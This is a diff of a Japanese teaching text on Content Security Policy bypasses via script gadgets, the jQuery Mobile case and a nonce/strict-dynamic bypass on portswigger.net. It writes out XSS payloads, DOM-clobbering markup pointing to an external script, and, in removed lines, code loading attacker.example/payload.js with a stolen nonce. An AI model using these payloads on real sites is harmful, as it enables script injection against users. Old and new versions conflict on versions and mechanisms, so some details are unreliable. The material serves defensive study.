+> 本節ではラボの攻略手順そのものは扱わない。原理の理解と防御設計への応用を目的とする。掲載したコードは、論文・PoCが公開している「なぜ現行対策が原理的に破られるか」を説明するための引用であり、対象バージョン（2016〜2017年頃）における研究成果である点に留意すること。
+
+> 出典: Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets (ACM CCS 2017) — https://acmccs.github.io/papers/p1709-lekiesA.pdf
 
 ---
 
 ## CSPバイパス実例（Truesec / PortSwigger nonce）
 
-CSP（Content Security Policy／コンテンツセキュリティポリシー。ブラウザに「このオリジンのスクリプトだけ実行してよい」といった許可リストを伝えるHTTPレスポンスヘッダ）は、反射型・格納型XSSに対する強力な多層防御として広く導入されている。しかし「CSPを設定した＝XSS不可能」ではない。本節では、CSPの理論的な穴ではなく、**実運用で実際に破られた2つの具体的な実例**を通じて、なぜ堅牢に見えるCSPが陥落するのかを仕組みレベルで理解する。
+CSP（Content Security Policy）は「どこから読み込まれたスクリプトなら実行してよいか」をブラウザに指示するHTTPレスポンスヘッダーです。厳格に設定すれば、攻撃者が`<script>`タグをHTMLインジェクションで注入しても、そのスクリプトのソース（`src`属性やインラインコード）がポリシーの許可リストに載っていない限りブラウザは実行を拒否します。
 
-キーワードは「**script gadget（スクリプトガジェット）**」と「**nonce漏洩**」である。どちらも、CSP自体のロジックにバグがあるわけではなく、「CSPが許可した正規のコードを、攻撃者が意図しない用途に流用する」という共通の構造を持つ。
+しかし「CSPが設定されている」ことと「XSSが起きない」ことはイコールではありません。CSPはあくまで**ブラウザが実行時に判定するホワイトリスト機構**であり、ポリシーが許可している既存の正規スクリプト（jQueryなどの一般的なライブラリ、あるいはサイト自身が読み込んでいるJavaScript）の**内部ロジックを乗っ取って攻撃者の狙い通りに動かす**ことができれば、CSP違反を一切起こさずに任意コード実行に到達できます。このテクニックは「スクリプトガジェット（Script Gadgets）」あるいは「コード再利用攻撃（Code-Reuse Attacks）」と呼ばれ、2017年にSebastian Lekies・Krzysztof Kotowicz・Eduardo Vela Nava らがACM CCSで発表した論文「Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets」で体系化されました。
 
-### 4-L-1 script gadget型バイパス：jQuery Mobileの実例（Truesec）
+本節では、この考え方を実例で示すTruesecのブログ記事と、実際にPortSwigger自身のサイトで見つかったnonceベースCSPのバイパス事例を通して、「CSPがあっても壊れる仕組み」を掘り下げます。
 
-#### script gadgetとは何か
+### スクリプトガジェットの基本発想
 
-まず用語を定義する。**script gadget**とは、「攻撃者が直接スクリプトを注入しなくても、ページ上に既に読み込まれている“正規の”JavaScriptコードを、DOM構造やHTML属性の細工だけで“悪用可能な形”に誘導し、結果的に任意コード実行に持ち込む部品」を指す。
+スクリプトガジェットとは、「攻撃者が直接JavaScriptを注入しなくても、既存の正規コードに特定のDOM状態（要素・属性・テキスト）を与えるだけで、そのコードが代わりにJavaScriptを実行してくれる」ような処理のことです。バイナリ解析の世界でいう「ROP（Return-Oriented Programming）ガジェット」のWeb版だと考えると理解しやすいでしょう。攻撃者は新しい命令（コード）を注入するのではなく、既にメモリ（この場合はページ内の正規スクリプト）に存在する命令列を、入力データで無理やり組み合わせて悪用します。
 
-CSPの`script-src`は「どのスクリプトを実行してよいか」を制御するが、あくまで**スクリプトの出所（origin／nonce／hash）**を見ているだけであり、「そのスクリプトが内部で何をするか」までは検査しない。攻撃者がHTMLインジェクション（`<script>`タグやインラインイベントハンドラを使わない、単なるDOM構造の注入。CSPの直接の対象にならない）しかできない状況でも、既にCSPで許可されているライブラリ（jQuery、jQuery Mobile、AngularJS、Vue.jsなど）が「特定のHTML属性や構造を見つけると自動的にコードを実行する」という機能を持っていれば、それを**踏み台（gadget）**として使い、CSPには一切違反せずにスクリプト実行まで到達できる。
+ガジェットは大まかに次のように分類されます。
 
-この概念を体系的に整理し広めたのはSebastian Lekiesらの研究（Google, 2017年 Black Hat/AppSec EU発表）だが、Truesecのブログはこの考え方を、より実践的に**jQuery Mobileという実在のライブラリの脆弱な挙動**に当てはめて解説している点に価値がある。
+- **文字列操作ガジェット**: 属性値やテキストをそのままevalやinnerHTMLに渡してしまう処理
+- **要素構築ガジェット**: ユーザー入力を元にDOM要素を組み立てる際、エスケープが不十分な処理
+- **関数生成ガジェット**: `new Function()`やテンプレートエンジンの式評価器
+- **実行シンク**: 最終的に`eval`・`setTimeout(string)`・`Function`コンストラクタなどJavaScriptとして解釈させる箇所
 
-#### 前提条件
+CSPがブロックするのは「攻撃者が新しく持ち込んだスクリプト」であって、「サイトにもとから存在し許可された正規スクリプトが、汚染されたデータをもとに実行する処理」ではありません。ここに抜け道が生まれます。
 
-この攻撃が成立するための前提は次の通りである。
+### Truesecの実例：jQuery Mobile Popup Widgetを使ったコード再利用攻撃
 
-- サイトのCSPが`script-src`にjQuery Mobile本体（あるいはそれをホストするCDN）を許可している。
-- 攻撃者が使えるのは**HTMLインジェクション**（例えば`innerHTML`へのユーザー入力代入や、サニタイザ通過後のDOM構造操作）のみで、`<script>`タグの直接注入・インラインイベントハンドラ・`javascript:`スキームはCSPやサニタイザによって阻止されている。
-
-#### 仕組み
-
-jQuery Mobileは、ページ内に挿入されたDOM要素を**自動的に「拡張（enhance）」する**設計になっている。具体的には、`data-role`をはじめとする`data-*`属性を持つ要素をライブラリが定期的・イベント駆動的に走査し、その属性値に応じて対応するウィジェットのロジック（ポップアップ表示、ページ遷移、コラプシブルパネルの開閉など）を**自動実行**する。この「属性を見て自動的に処理を行う」仕組み自体はCSP登場以前から存在する便利機能だが、CSP時代においては次のような危険な構造になる。
-
-- 攻撃者は`<script>`を注入できなくても、`data-role="popup"`や`data-transition`といった**属性つきのDOM要素をHTMLインジェクションで挿入**できれば十分。
-- jQuery Mobile側のウィジェット処理コードが、その属性値やリンク先（`href="#id"`によるDOM内フラグメント参照）を**信頼できる設定値として無検証で処理**してしまう経路がある場合、属性値の内容によっては最終的にDOM操作や既存コードパスの誤用を通じて、攻撃者が意図した副作用（別要素の内容やイベントハンドラの実行につながる状態）を引き起こせる。
-- 重要なのは、**このとき実行されているスクリプトはすべて「CSPで許可済みのjQuery Mobile本体」自身**であり、CSPのポリシー評価上は一切違反していないという点である。CSPは「誰が書いたコードか」でしか許可を判定できず、「そのコードが今まさに攻撃者に悪用されているか」は判定できない。これがscript gadget型バイパスの本質的な原理である。
-
-```html
-<!-- 攻撃者がHTMLインジェクションで挿入できるのは <script> を含まない
-     「一見無害な」data-*属性つきのマークアップのみ -->
-<div data-role="popup" id="p1" data-transition="flip">
-  ...attacker-controlled markup...
-</div>
-<a href="#p1" data-rel="popup">click</a>
-```
-> なぜ動くか: `<script>`もインラインハンドラも存在しないため、CSPの`script-src`・`unsafe-inline`禁止のいずれにも抵触しない。しかしCSPで許可済みのjQuery Mobile本体が、この属性つき構造をページロード後に自動走査・自動実行する設計になっているため、DOM構造の注入だけでライブラリの内部ロジックを起動できてしまう。
-
-#### 影響とバージョン
-
-Truesecの記事、および元となったLekiesらの研究では、**jQuery Mobile 1.4.5**（同ライブラリの事実上最後の安定版。2014年10月リリース）が、CSP・XSSフィルタ・DOMPurifyなど複数のミティゲーションを同時にすり抜けられる代表的な脆弱ライブラリとして繰り返し引用されている。jQuery Mobileは2021年に事実上の開発終了（メンテナンス終了）となっており、今後修正パッチが提供される見込みはない。したがって**「許可リストに古いUIライブラリが乗っている」こと自体がCSPの実効性を無効化しうる**、という教訓が重要になる。
-
-#### 防御
-
-- CSPの`script-src`に**バージョンを固定した信頼できるスクリプトのみ**を列挙し、jQuery Mobileのような「DOM走査による自動実行」を行う汎用UIライブラリを許可リストに含める場合は、既知のgadgetがないか個別に検証する。
-- サニタイザ（DOMPurify等）は`<script>`やイベントハンドラ属性の除去だけでなく、**サイトで使用中のライブラリが解釈する独自の`data-*`属性・構造**も踏まえて設計する。
-- 最終的な防御としては、DOM sink（入力が最終的に実行・解釈される危険な代入先。例：`innerHTML`）へのユーザー入力到達そのものを断つのが最も確実であり、CSPはあくまで多層防御の一枚として扱う。
+Truesecのブログ記事は、この「ガジェット」の考え方を具体的なjQuery Mobileの脆弱な処理を使って再現したものです。
 
 > 出典: Bypassing modern XSS mitigations with code-reuse attacks — https://www.truesec.com/hub/blog/bypassing-modern-xss-mitigations-with-code-reuse-attacks
-（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約と、関連する一次研究であるSebastian Lekies et al., "Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets"（Black Hat USA / AppSec EU, 2017）、および Google製の実証コード集 `google/security-research-pocs`（script-gadgets/bypasses.md）の情報を踏まえて構成した。）
 
----
+#### 前提となるCSP設定
 
-### 4-L-2 nonceベースCSPが「自社サイトで」破られた実例（PortSwigger Research）
+記事で例示されているCSPは次のようなものです。
 
-#### nonceベースCSPの位置づけ
+```
+Content-Security-Policy: script-src 'self' https://code.jquery.com:443 'unsafe-eval'; object-src 'none';
+```
 
-`script-src`をホスト名の許可リスト（allowlist）で書く方式は、許可ドメイン上にJSONPエンドポイントやオープンリダイレクトなど**「間借りできるスクリプト」**が1つでもあればバイパスされやすいことが知られている。そこで近年推奨されているのが**nonce（ノンス。リクエストごとにサーバーが生成するランダムな一回限りのトークン）ベースのCSP**である。
+これは一見厳しく見えます。攻撃者が任意のドメインからスクリプトを読み込むこと（外部の`evil.com/x.js`のようなURL）はブロックされますし、`object-src 'none'`によってFlash等を使ったプラグイン系のバイパスも塞がれています。しかし`https://code.jquery.com`という**CDN経由の正規ライブラリ**が許可リストに載っている点がポイントです。攻撃者はこのjQuery自身（あるいはjQuery Mobile）のコードを「踏み台」として使います。
+
+#### 脆弱な処理：Popup Widgetのid出力
+
+jQuery Mobileには`data-role="popup"`でポップアップUIを生成するウィジェットがあります。このウィジェットは、指定された`id`属性の値を、内部的にHTMLコメントとして書き出す処理を持っていました（ポップアップの一意な識別・後方互換のためのマークアップ生成ロジックの一部です）。ここでの核心的な問題は、`id`属性の値が**エスケープされずにHTMLコメントの内側にそのまま書き込まれる**ことです。
+
+HTMLコメントは`<!--`で始まり`-->`で終わります。攻撃者が`id`属性の値の中に`-->`という文字列を仕込めば、生成されたHTMLの中でコメントがそこで**強制終了**し、それ以降に続けて書いた文字列は通常のHTMLとしてパーサに解釈されます。これは「パーサの再解釈（コンテキストブレイクアウト）」の典型例です。ペイロードは次のようになります。
+
+```html
+<div data-role="popup" id="--!><script>alert(1)</script>"></div>
+```
+
+これをHTMLインジェクション（たとえば反射型XSSの脆弱なパラメータや、掲示板のような場所へのマークアップ注入）で流し込むと、jQuery Mobileのポップアップ初期化コードが`id`属性値をそのままコメント文字列に埋め込みます。結果として生成されるHTML断片は概ね次のような形になります。
+
+```html
+<!-- id: --!><script>alert(1)</script> -->
+```
+
+`-->`の直前に`--`が既にあるため、パーサ的には`id: --` + `!>` の時点でコメントが終了し、続く`<script>alert(1)</script>`が独立したscript要素としてDOMに現れます。ここで挿入されるのはインラインの`<script>`タグですが、これは**攻撃者が最初から用意していたペイロード文字列がjQuery Mobileの正規コードによってDOMに書き込まれた結果**であり、jQuery自体（`code.jquery.com`）はCSPで許可済みのソースとして実行されます。つまりCSPの`script-src`ディレクティブに違反する新規外部スクリプトの読み込みは一切発生せず、既存の許可されたスクリプト（jQuery Mobile本体）が、汚染された`id`値というデータを経由して攻撃者の望むDOM操作（scriptタグの挿入）を代行してくれるわけです。
+
+記事ではさらに前段として、シンプルな`img`要素のonerrorガジェットも紹介されています。
+
+```html
+<img src="n/a" onerror="alert('XSS')"/>
+```
+
+これ自体はCSPが`script-src`でインラインイベントハンドラをブロックしていれば通常は動きません（`unsafe-inline`が無い限りイベントハンドラ属性はCSP違反になります）。Truesecの主張は、こうした素朴なペイロードが弾かれる状況でも、ライブラリの内部ロジックというもう一段深い「実行経路」を使えば、CSPが想定していない形でコードが実行されるということです。
+
+#### 影響を受けたバージョンと位置づけ
+
+記事および関連する2017年のLekiesらの原論文では、検証対象として**jQuery 1.8.3およびjQuery Mobile 1.2.1**が例示されています。より重要なのは個別のバージョンそのものよりも、この研究が調査対象とした**16の広く使われているJavaScriptライブラリのほぼすべてに、複数のスクリプトガジェットが存在した**という事実です。つまり「今使っているライブラリのこのバージョンさえ避ければ安全」という単純な話ではなく、複雑なDOM操作ロジックを持つライブラリ全般に共通するリスクだと理解する必要があります。この種の問題は個別のCVE番号で管理されるというより、「XSSフィルタ／CSP／サニタイザのバイパス手法そのもの」として研究コミュニティに認識されています。
+
+#### 防御策
+
+Truesecが強調する対策は次の3点に集約されます。
+
+1. **根本原因の修正を優先する**: CSPはあくまで多層防御の一枚であり、根本的にはユーザー制御下のデータを挿入先のコンテキスト（HTML本文・属性値・URL・JavaScript文字列など）に応じて正しくエンコード／エスケープすることが必須です。
+2. **secure-by-defaultなフレームワークを使う**: Angularの`trustAsHtml`やReactの`dangerouslySetInnerHTML`のような「危険であることが名前からも分かる」APIを避け、フレームワークが標準で提供する自動エスケープ機構に乗ること。
+3. **CSPを唯一の防御層にしない**: 「CSPはバイパスされうる」という前提に立ち、脆弱性そのものの修正、入力サニタイズ、出力エンコーディングと組み合わせた多層防御を行うこと。
+
+### PortSwiggerの実例：動的解析でnonceベースCSPを崩す
+
+もう一つの実例は、PortSwigger Researchが自社サイト（portswigger.net）で実際に発見した、nonceベースCSPのバイパスです。これは「Burp Scannerの動的解析（Dynamic Analysis）」がどのように実際のCSPバイパスを自動検出したかというケーススタディでもあります。
+
+> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis （公開日: 2021年9月17日）
+
+#### nonceベースCSPが想定している保護
+
+nonceベースCSPとは、ページを描画するたびにサーバー側でランダムな一回限りのトークン（nonce）を生成し、レスポンスヘッダーとHTML中の`<script>`タグの両方に埋め込む方式です。
 
 ```
 Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
 ```
 
-`<script nonce="r4nd0m123">...</script>`のように、レスポンス発行時に埋め込まれた正しいnonce値を持つ`<script>`だけが実行を許される。攻撃者はHTMLインジェクションができても、**レスポンスごとに変わる正しいnonce値を知らない限り**自分のスクリプトタグに正しいnonceを付けられないため、原理的にXSSを実行に持ち込めない――というのが設計上の期待である。
-
-PortSwiggerの研究チームは、この「nonceベースCSPはallowlist型より安全」という通説を検証する過程で、**自社サイトportswigger.net自身**が実際にnonceベースCSPをバイパスされていたことを発見した。これは2023年12月9日にセキュリティ研究者Johan Carlsson（joaxcar）からHackerOne経由で報告された脆弱性（HackerOne報告 #2279346）で、2024年2月に詳細なwriteupが公開されている。
-
-#### `strict-dynamic`が生む伝播的信頼という仕組み
-
-上記のポリシー例にある`'strict-dynamic'`キーワードが本質的に重要である。これは「**正しいnonceを持つ`<script>`が、実行中に動的に生成・挿入した別の`<script>`要素は、たとえその新しい要素にnonceが付いていなくても信頼して実行してよい**」という、CSP仕様上の“信頼の伝播”ルールである（ホスト許可リストを無効化し、その代わりにこの伝播ルールを使う設計）。
-
-これは実務上非常に重要な意味を持つ。**一度でも正規のnonceを持つスクリプトの実行コンテキストを乗っ取れれば（あるいは、有効なnonce値そのものを盗み出せれば）、その後は好きなだけスクリプトタグを動的に生成してDOMに追加でき、`strict-dynamic`のもとではnonceチェックなしに実行される**。つまりnonceベースCSPの安全性は、実質的に「有効なnonce値が外部から一切読み取れないこと」に懸念点が一極集中する。
-
-#### nonce漏洩の経路：DOMプロパティとしてのnonce
-
-ブラウザの仕様では、HTMLソース上の`nonce`属性値は、ページ描画後にセキュリティ上の配慮から**HTML属性としては`getAttribute("nonce")`で読めなくなる（空文字を返す）**ようマスクされる（いわゆるnonce hiding）。しかし同じ値は**DOMのJavaScriptプロパティ`element.nonce`としては引き続き読み取り可能**という非対称な設計になっている。
-
-```js
-document.querySelector('script').nonce // 正しいnonce値が取得できてしまう
-document.querySelector('script').getAttribute('nonce') // "" (マスクされる)
+```html
+<script nonce="r4nd0m123">/* 正規スクリプト */</script>
 ```
-> なぜ動くか: nonce hidingはあくまで「攻撃者がHTMLソースやDOMのシリアライズ結果（`outerHTML`など）を盗み見て値を持ち出す」経路を塞ぐための対策であり、ページ上で**既に実行できているJavaScriptコード**が`.nonce`プロパティに直接アクセスすることまでは防げない。攻撃者がすでに何らかの形でJavaScript実行の糸口（script gadget等）を得ていれば、この一行だけで有効なnonceを取得できる。
 
-PortSwiggerの実例では、この「`.nonce`プロパティ経由でのnonce取得」を、**AngularJSのエラーハンドリング機構を悪用するscript gadget**（4-L-1で解説したものと同種の手法）と組み合わせていた。要点は次の通りである。
+ブラウザは、実行しようとしているスクリプト要素の`nonce`属性値がCSPヘッダーで宣言された値と一致する場合のみ実行を許可します。攻撃者はレスポンスのたびに変わるこのトークンの値を事前に知ることができないため、HTMLインジェクションで`<script>`タグを注入しても、正しい`nonce`値を付与できず実行がブロックされる——というのが設計上の想定です。
 
-1. 攻撃者はサイト内の何らかの箇所にHTMLインジェクション（`<script>`タグを直接使わない、AngularJSに解釈される属性つきマークアップの注入）を成立させる。
-2. その注入されたマークアップがAngularJSのエラーハンドラ経由のgadgetとして機能し、ページ内で**任意のJavaScript式**を評価できる状態になる。
-3. その評価式の中で`document.querySelector('[nonce]').nonce`のようなセレクタを使い、ページ上に存在する正規スクリプトタグの有効なnonce値を取得する。
-4. 取得したnonce値を使って、攻撃者が新しい`<script src="https://attacker.example/payload.js" nonce="盗んだ値">`要素を動的に生成しDOMに追加する。
-5. `strict-dynamic`が有効なため、この新しい要素はホスト許可リストのチェックを受けず、**正しいnonceさえ持っていれば無条件で実行される**。
+さらに`'strict-dynamic'`というキーワードが付与されている場合、挙動が一段複雑になります。これは「nonceで信任されたスクリプトが、実行中に動的に生成・挿入した新しいスクリプト」については、その新しいスクリプト自身にnonceが付いていなくても信頼を引き継いで実行してよい、というルールです。これは正規のSPAフレームワークなどが実行時に`document.createElement('script')`で追加のコードを読み込む挙動を壊さないための救済措置ですが、裏を返せば「**nonceで信任された既存スクリプトの内部ロジックさえ乗っ取れれば、そこから生成される新しいスクリプトはnonceなしで実行できてしまう**」という、CSPにおける典型的なスクリプトガジェットの温床になります。
 
-```js
-// 概念を単純化した攻撃コード（実際のgadgetの起動方法はAngularJSの
-// エラーハンドラ機構に依存するため詳細はwriteup原文を参照）
-const stolenNonce = document.querySelector('[nonce]').nonce;
-const s = document.createElement('script');
-s.src = 'https://attacker.example/payload.js';
-s.nonce = stolenNonce;
-document.head.appendChild(s);
+#### 発見された脆弱なコード
+
+PortSwiggerの記事によれば、Burp Scannerの動的解析エンジンが、あるページ上のJavaScriptで「input要素の値がscriptタグのURLをコントロールしている」パターンを自動的に検出しました。該当する（サイト自身が読み込んでいた）正規のJavaScriptはおおむね次のような処理でした。
+
+```javascript
+var t = document.querySelector("[id^='RecaptchaClientUrl-']").value,
+    i = document.querySelector("[id^='RecaptchaClientSecret-']").value,
+    n = document.createElement("script");
+n.id = "RecaptchaScript";
+n.src = t + i;
 ```
-> なぜ動くか: ブラウザはCSPの`script-src`評価時に、新規挿入された`<script>`要素の`nonce`プロパティを見て、レスポンスヘッダで宣言された値と一致すれば実行を許可する。`strict-dynamic`下ではさらにホスト由来のチェックが免除されるため、正しいnonce値さえ再現できれば任意の外部ペイロードを読み込めてしまう。
 
-#### 「動的解析」が果たした役割
+これはGoogle reCAPTCHA連携用のスクリプトを動的に読み込むための、ごく普通に見えるコードです。`id`が`RecaptchaClientUrl-`から始まる要素の`value`を読み取り、それを新しく作った`<script>`要素の`src`に組み立てて挿入しています。ここでの`querySelector`は、**CSSセレクタにマッチする最初の1要素だけ**を返す仕様であることが決定的な弱点になります。
 
-PortSwigger Researchの記事タイトルが強調する“dynamic analysis（動的解析）”とは、静的なコードレビューやCSPヘッダの文面確認ではなく、**実際にブラウザでページをレンダリングし、DOM上で発生するイベントや関数呼び出しの結果を実行時に観測する検査手法**を指す。今回のケースでは、`document.querySelector`が条件に一致する要素が複数存在するとき常に**「文書順で最初の1要素」だけを返す**という、ごく基本的でありふれたDOM APIの仕様が、思わぬ形で「攻撃者から見て予測可能な正規nonce値の取得口」になっているという、静的な設定確認だけでは気づきにくい類の欠陥を、実行時の挙動観測によって機械的に発見できた点がこの研究の主眼である。
+#### 攻撃：DOM Clobberingでガジェットの入力を乗っ取る
 
-#### 防御策
+もしページ上のどこかに攻撃者がHTMLを注入できる場所（たとえ小さなHTMLインジェクションであっても）があれば、次のような要素を、正規の`RecaptchaClientUrl-...`という`id`を持つ本物の要素より**DOM上で先に**出現するように注入します。
 
-- `strict-dynamic`は非常に強力な代わりに、**nonceの機密性が100%失われた瞬間に防御全体が崩壊する**運用リスクを背負うことを理解した上で採用する。
-- ページ内のどこであれ、**攻撃者が制御できるコンテキストからJavaScriptを1行でも実行できる状態（script gadgetを含む）を残さない**。nonceベースCSPは「XSSを実行させない」対策ではなく「XSSされても被害を限定する」多層防御の一部であり、他のXSS対策（サニタイズ、Trusted Types等）を代替しない。
-- 使用中のフロントエンドフレームワーク（AngularJS、Vue.js等）が持つエラーハンドラや属性解釈系のscript gadgetの有無を、既知の一覧（例：Google `security-research-pocs`のbypasses.md）と照合して点検する。
-- 自動化された動的スキャン（実ブラウザでのレンダリングとDOM挙動観測）を、CSPヘッダの静的検証に加えて定期的に実施する。
+```html
+<input id="RecaptchaClientUrl-" value="//portswigger-labs.net/xss/xss.js">
+```
 
-> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
-（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約に加え、同一の脆弱性について報告者本人が公開した詳細writeup「CSP bypass on PortSwigger.net using Google script resources」（Johan Carlsson／joaxcar.com, 2024年2月19日）、および対応するHackerOne公開報告 #2279346（2023年12月9日報告）の情報を踏まえて構成した。）
+先に説明した正規コードが実行されるとき、`document.querySelector("[id^='RecaptchaClientUrl-']")`はDOM順で最初にマッチした要素、つまり攻撃者が注入したこの`<input>`を返します。結果として`n.src`には攻撃者が完全に制御する外部URL（`//portswigger-labs.net/xss/xss.js`）が代入され、`document.head`などに追加された時点でそのスクリプトが読み込まれ、実行されます。
 
-### まとめ：2つの実例に共通する原理
+ここで見落としてはならないのは、**この`<script>`要素には`nonce`属性が一切付与されていない**という点です。それでもブロックされずに実行されたのは、この`<script>`要素自体が「nonceで信任済みの正規スクリプト（reCAPTCHA連携コード）」によって動的に生成・挿入されたものであり、CSPポリシーに`'strict-dynamic'`が含まれていたためです。`'strict-dynamic'`のルールにより、信任されたスクリプトが生成した子スクリプトは、URLのホワイトリストチェックもnonceチェックも受けずに実行を許可されます。つまりこの攻撃は、
 
-Truesecの事例とPortSwiggerの事例は、表面的には「script gadget」と「nonce漏洩」という別々の技術に見えるが、**CSPが“コードの出所”しか検証できず“実行内容の妥当性”は検証しないという同一の限界**に根ざしている点で本質的に同じ構造を持つ。CSPを設計・運用する際は、「許可リストに載っているコードは安全」と考えるのではなく、「許可リストに載っているコードが攻撃者にとっての踏み台（gadget）になりうるか」「信頼の伝播（`strict-dynamic`やnonceの露出経路）がどこまで及ぶか」を常に併せて検証する必要がある。
+1. HTMLインジェクションで属性を上書きする**DOM Clobbering**（正規コードが参照するはずの要素を、攻撃者が用意した別の要素で「かぶせて」乗っ取るテクニック）と、
+2. `querySelector`が「最初の一致」しか見ないという仕様、
+3. `'strict-dynamic'`が動的生成スクリプトへの信頼を継承する仕様
+
+という3つの要素が組み合わさって成立する、教科書的なスクリプトガジェット攻撃です。攻撃者は一切新しいJavaScriptコードそのものを注入していません。注入したのは単なる`<input>`要素であり、実際に悪意あるスクリプトを`document.head`に挿入して実行したのは、サイト自身が書いた正規のreCAPTCHA連携コードです。
+
+#### 発見手法：Burp Scannerの動的解析
+
+この脆弱性は人間の目視によるコードレビューではなく、**Burp Scannerの動的解析（Dynamic Analysis）**によって自動的にフラグが立てられました。記事の言葉を借りれば「Burp scanner had spotted that the value of an input element was being used to control a script URL」——つまりスキャナーは、ページの実行をブラウザエンジン上で追跡し、「input要素の値がスクリプトのURL生成に流れ込んでいる」というデータフローそのものを検出したということです。これは静的なパターンマッチ（正規表現でペイロード文字列を探す）ではなく、実際にDOM操作の結果を動的に観測して「攻撃者が制御可能な値が、危険なシンク（この場合はscriptのsrc生成）に到達するか」を追跡する手法であり、スクリプトガジェットのようにペイロード自体が単純な入力データにしか見えないケースの発見に強みを持ちます。
+
+#### 修正・教訓
+
+記事が示す推奨修正は非常にシンプルです。
+
+> "The best fix for this issue is to avoid giving an attacker control over the URL, so specifying a static string to the script's location would prevent this issue."（この問題への最良の修正は、攻撃者にURLの制御権を与えないことである。スクリプトの読み込み先を静的な文字列として直接指定すれば、この問題は防止できる。）
+
+つまり、そもそも「DOMから動的に値を読み取ってスクリプトのURLを組み立てる」という設計自体をやめ、スクリプトのURLをコード内にハードコードすべきだった、ということです。PortSwiggerはこの報告を受けてCSP設定・該当コードを修正しました。
+
+この事例が示す教訓は明確です。
+
+- **nonceや`'strict-dynamic'`があっても、正規スクリプトの内部ロジックが「攻撃者が影響できるDOM値」から実行対象を決定していれば、そこがガジェットになる**。
+- **DOM Clobbering（同じidを持つ要素をすり替える、あるいは先に出現させる）は、`querySelector`・`getElementById`のように「最初の一致」を返すAPIと組み合わさると特に危険**。CSPそのものをすり抜けるだけでなく、DOM上の変数参照を書き換えてロジック全体を乗っ取る手段として広く応用が利く。
+- **重要な脆弱性は自動化されたツール（動的解析）によっても発見できる**。ペイロードの見た目が「ただのHTMLインジェクション」であっても、その先に危険なシンクへ到達するデータフローがあるかどうかを実行時に追跡することが有効。
+
+### まとめ：CSPは万能ではない
+
+TruesecとPortSwiggerの2つの実例は、まったく異なるメカニズム（HTMLコメントの脱出 vs DOM Clobbering + strict-dynamic）を使っていますが、共通する本質は同じです。**CSPは「新しく持ち込まれた不正なスクリプト」を防ぐことには強い一方、「もとから許可されている正規スクリプトが、汚染されたデータをもとに危険な処理を代行してしまう」ケースには無力**だということです。これは`unsafe-eval`やインラインスクリプトを禁止するような厳格な設定であっても変わりません。
+
+実務上の教訓として、CSPを導入する際は次の点を意識すべきです。
+
+- ホワイトリストに載せるライブラリやCDNは、それ自体がガジェット（DOM操作を汚染データから行う処理）を持たないか検討する。特にjQuery系・テンプレートエンジン系・古いUIウィジェットライブラリは要注意。
+- `'strict-dynamic'`を使う場合、動的に生成されるスクリプトの`src`やコンテンツが、いかなる経路であってもユーザー制御下のDOM値から組み立てられていないかを確認する。
+- `querySelector`・`getElementById`・`window`のグローバル変数参照など、「複数の要素が同じ名前・IDを持ちうる」箇所は、DOM Clobberingの被害を受けやすい設計になっていないか点検する。
+- CSPはあくまで多層防御の一部と位置づけ、根本的な出力エンコーディングや入力バリデーションを省略しない。
+
+CSPバイパスの発見は年々、こうした「地味なガジェット探し」にシフトしています。ペイロードそのものより、「このサイトにはどんな正規スクリプトが動いていて、それはどんなDOM値を信用しているか」を読み解く力が、CSP環境下でのXSS発見において最も重要なスキルになります。
 
 ---
 
 ## CSPバイパス総まとめ（joaxcar / Beyond XSS / HackTricks）
 
-CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、あるいはそもそも突破しなくても情報を盗めてしまうケースがあるという事実である。本節では実際のバグバウンティ報告（joaxcar）、体系的なチートシート的教材（Beyond XSS）、実務リファレンス（HackTricks）の3つの視点からCSPバイパスを整理する。
+CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、そもそも突破しなくても情報が漏れてしまうケースがあるという事実である。本節では、実際のバグバウンティ報告（joaxcar による portswigger.net のバイパス）、体系的な解説教材（Beyond XSS）、実務リファレンス（HackTricks）という3つの視点から、CSPバイパスのカタログを整理する。
 
-まず前提知識を短く確認する。CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action` などのディレクティブごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトタグ等のsink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、ここでは「スクリプトとして実行される場所」全般を指す）に到達するたびに、そのリソースの取得元URLやインラインかどうかをCSPのソースリストと照合し、一致しなければブロックする。**CSPバイパスとは、この照合ロジックの「抜け」や「解釈のズレ」を突いて、ポリシーが許可しているはずのない挙動を実行させる技術群**である。バイパスの多くは「攻撃コード自体の巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクトなど）が存在する」という運用上の見落としを突く点に本質がある。
+隣接する節との棲み分けを先に述べておく。CSPが構造的になぜ破れやすいのかという理論（Googleの "CSP Is Dead" 論文と `strict-dynamic`）は **s4i**、スクリプトガジェット／コード再利用による「CSP違反ゼロでの任意コード実行」の実例（Truesec・PortSwigger nonce）は **s4l** で扱った。本節はそれらを踏まえたうえで、実戦で使う**バイパス手法そのものの網羅的カタログ**を提供する。
 
----
+### 前提：CSPの照合ロジックを一段深く理解する
 
-### 1. joaxcar: PortSwigger.net における Google スクリプトリソースを使った CSP バイパス
